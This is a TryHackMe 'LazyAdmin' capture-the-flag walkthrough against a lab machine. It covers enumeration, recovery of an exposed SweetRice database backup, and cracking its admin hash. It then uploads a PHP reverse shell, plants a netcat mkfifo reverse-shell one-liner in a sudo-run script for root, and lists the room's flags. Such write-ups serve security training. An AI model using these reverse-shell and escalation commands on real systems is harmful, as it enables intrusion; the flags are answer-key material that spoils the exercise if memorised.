# 🛡️ TryHackMe: LazyAdmin – Walkthrough & Report

**Room:** [LazyAdmin](https://tryhackme.com/room/lazyadmin)  
**Difficulty:** Easy  
**Target IP:** 10.10.187.142  
**Objective:** Capture the user and root flags by identifying and exploiting vulnerabilities

---

## 🧭 Enumeration

### 🔎 Nmap Scan

```bash
nmap -Pn -sC -sV -oN lazyadmin.nmap 10.10.187.142
```

**Findings:**

- `22/tcp` – OpenSSH
- `80/tcp` – Apache HTTPD with default Ubuntu page

---

## 🌐 Web Discovery

Visited `http://10.10.187.142`, revealed default Apache page.  
No custom web app present at root.

Used Gobuster to enumerate directories:

```bash
gobuster dir -u http://10.10.187.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Findings:**

- `/content/`
- `/server-status/` (403)

Further enumeration on `/content/` revealed:

- `/content/as/`
- `/content/inc/`
- `/content/inc/mysql_backup/`

---

## 🔍 CMS Identification

Visiting `/content/` revealed the site is running **SweetRice CMS**, which is known to be vulnerable.

---

## 💥 Exploitation: SweetRice Backup Disclosure

Visited:

```
http://10.10.187.142/content/inc/mysql_backup/
```

Found file:

```
mysql_backup_20191129023059-1.5.1.sql
```

Downloaded with:

```bash
wget http://10.10.187.142/content/inc/mysql_backup/mysql_backup_20191129023059-1.5.1.sql
```

Cracked MD5 hash:

```
42f749ade7f9e195bf475f37a44cafcb → Password123
```

---

## 🔐 Gaining Access

Logged in at:

```
http://10.10.187.142/content/as
```

With credentials:

```
Username: manager
Password: Password123
```

---

## 🐚 Reverse Shell

1. Downloaded reverse shell:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

2. Edited IP and port:

```php
$ip = '10.11.0.5';  // Attacker IP
$port = 4444;
```

3. Renamed and uploaded via admin panel:

```bash
mv php-reverse-shell.php shell.phtml
```

4. Set up listener:

```bash
nc -lvnp 4444
```

5. Triggered shell → Connected as `www-data`

---

## 🧑‍💻 Privilege Escalation

Checked sudo rights:

```bash
sudo -l
```

Allowed to run:

```
/usr/bin/perl /home/itguy/backup.pl
```

Content of `backup.pl`:

```perl
system("/etc/copy.sh");
```

Overwrote `/etc/copy.sh` with a reverse shell:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <your-ip> 5554 > /tmp/f" > /etc/copy.sh
```

Started listener:

```bash
nc -lvnp 5554
```

Executed:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Gained root shell.

---

## 🏁 Flags Captured

- **User Flag:** `THM{63e5bce9271952aad1113b6f1ac28a07}`
- **Root Flag:** `THM{6637f41d0177b6f37cb20d775124699f}`

---
